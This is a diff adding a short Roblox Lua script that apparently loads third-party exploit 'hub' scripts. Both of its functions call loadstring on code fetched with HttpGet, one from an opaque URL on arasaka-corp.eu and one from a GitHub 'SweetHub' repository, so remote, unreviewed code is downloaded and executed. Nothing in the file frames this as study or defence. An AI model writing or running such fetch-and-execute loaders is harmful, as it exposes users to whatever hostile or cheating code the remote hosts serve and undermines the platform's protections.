@@ -1,0 +1,13 @@
+-- Script 1
+local script1 = function()
+loadstring(game:HttpGet("https://arasaka-corp.eu/scripts/uazDGZZd6oHmfeJSAFHYjrg4i5dfeqk7P2kmHQr3JAn54QWV.lua"))()
+end
+
+script1()
+
+-- Script 2 starts only after Script 1 returns
+local script2 = function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SweetBloxy/SweetHub/refs/heads/main/SweetHub"))()
+end
+
+script2()
